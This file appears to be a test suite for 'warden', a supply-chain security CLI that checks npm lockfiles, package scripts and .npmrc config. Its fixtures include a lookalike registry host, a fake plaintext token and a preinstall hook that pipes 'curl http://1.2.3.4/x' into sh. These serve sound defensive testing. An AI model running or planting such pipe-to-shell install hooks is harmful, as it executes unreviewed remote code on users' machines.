import { expect, test } from "bun:test";
import { CHECK_SURFACES } from "../../src/cli/commands/check.ts";
import { defaultWardenDeps, runWarden, type WardenDeps } from "../../src/cli/main.ts";
import { AUDIT_JSON_SCHEMA } from "../../src/schema.ts";

const strip = (s: string) =>
  s.replace(new RegExp(`${String.fromCharCode(27)}\\[[0-9;]*m`, "g"), "");

function makeDeps(files: Record<string, string>, globbed: string[] = []) {
  const out: string[] = [];
  const err: string[] = [];
  const deps: WardenDeps = {
    ...defaultWardenDeps,
    home: "/home/u",
    cwd: () => "/proj",
    check: () => Promise.reject(new Error("registry must not be touched")),
    stdout: (s) => out.push(s),
    stderr: (s) => err.push(strip(s)),
    exists: (path) => path in files,
    readFile: (path) => {
      if (!(path in files)) throw new Error(`ENOENT ${path}`);
      return files[path] as string;
    },
    glob: () => globbed,
  };
  return { deps, out, err };
}

const cleanLock = JSON.stringify({
  packages: {
    "": {},
    "node_modules/a": {
      version: "1.0.0",
      resolved: "https://registry.npmjs.org/a.tgz",
      integrity: "sha512-a",
    },
  },
});

const hostileLock = JSON.stringify({
  packages: {
    "": {},
    "node_modules/a": { version: "1.0.0", resolved: "https://registry.npmjs.help/a.tgz" },
  },
});

test("every advertised check surface is actually routed", () => {
  expect([...CHECK_SURFACES]).toEqual(["lockfile", "scripts", "config"]);
});

test("check lockfile exits 0 on a clean lockfile and never hits the registry", async () => {
  const { deps, err } = makeDeps({ "/proj/package-lock.json": cleanLock });
  expect(await runWarden(["check", "lockfile"], deps)).toBe(0);
  expect(err.join("")).toContain("no lockfile issues");
});

test("check lockfile exits 20 on a lookalike registry host", async () => {
  const { deps, err } = makeDeps({ "/proj/package-lock.json": hostileLock });
  expect(await runWarden(["check", "lockfile"], deps)).toBe(20);
  expect(err.join("")).toContain("lockfile_lookalike_registry");
});

test("check scripts exits 20 on a pipe-to-shell preinstall", async () => {
  const { deps, err } = makeDeps({
    "/proj/package.json": JSON.stringify({
      name: "x",
      scripts: { preinstall: "curl http://1.2.3.4/x | sh" },
    }),
  });
  expect(await runWarden(["check", "scripts"], deps)).toBe(20);
  expect(err.join("")).toContain("script_pipes_download_to_shell");
});

test("check config exits 20 on a plaintext token", async () => {
  const { deps, err } = makeDeps({
    "/proj/.npmrc": "//registry.npmjs.org/:_authToken=npm_leakedValue",
  });
  expect(await runWarden(["check", "config"], deps)).toBe(20);
  const text = err.join("");
  expect(text).toContain("config_plaintext_credential");
  expect(text).not.toContain("npm_leakedValue");
});

test("--allow-risky downgrades a blocking surface finding to exit 10", async () => {
  const { deps } = makeDeps({ "/proj/package-lock.json": hostileLock });
  expect(await runWarden(["check", "lockfile", "--allow-risky"], deps)).toBe(10);
});

test("--dir audits somewhere other than the working directory", async () => {
  const { deps, err } = makeDeps({ "/elsewhere/package-lock.json": hostileLock });
  expect(await runWarden(["check", "lockfile", "--dir", "/elsewhere"], deps)).toBe(20);
  expect(err.join("")).toContain("/elsewhere");
});

test("--json emits a report matching the published audit schema", async () => {
  const { deps, out } = makeDeps({ "/proj/package-lock.json": hostileLock });
  expect(await runWarden(["check", "lockfile", "--json"], deps)).toBe(20);
  const report = JSON.parse(out.join(""));
  for (const key of AUDIT_JSON_SCHEMA.required) expect(report).toHaveProperty(key);
  const allowed = Object.keys(AUDIT_JSON_SCHEMA.properties);
  for (const key of Object.keys(report)) expect(allowed).toContain(key);

  const findingKeys = Object.keys(AUDIT_JSON_SCHEMA.properties.findings.items.properties);
  for (const finding of report.findings)
    for (const key of Object.keys(finding)) expect(findingKeys).toContain(key);
});

test("a surface takes no extra positional arguments", async () => {
  const { deps, err } = makeDeps({});
  expect(await runWarden(["check", "lockfile", "express"], deps)).toBe(30);
  expect(err.join("")).toContain("takes no further positional arguments");
});

test("check with no arguments points at both packages and surfaces", async () => {
  const { deps, err } = makeDeps({});
  expect(await runWarden(["check"], deps)).toBe(30);
  expect(err.join("")).toContain("lockfile, scripts, config");
});

test("warden schema audit is published for agents", async () => {
  const { deps, out } = makeDeps({});
  expect(await runWarden(["schema", "audit"], deps)).toBe(0);
  expect(JSON.parse(out.join("")).properties.surface.enum).toEqual([
    "lockfile",
    "scripts",
    "config",
  ]);

  const list = makeDeps({});
  await runWarden(["schema", "list"], list.deps);
  expect(JSON.parse(list.out.join("")).schemas).toContain("audit");
});

test("completions offer the check surfaces", async () => {
  for (const shell of ["bash", "zsh", "fish"]) {
    const { deps, out } = makeDeps({});
    expect(await runWarden(["completions", shell], deps)).toBe(0);
    const script = out.join("");
    for (const surface of CHECK_SURFACES) expect(script).toContain(surface);
  }
});
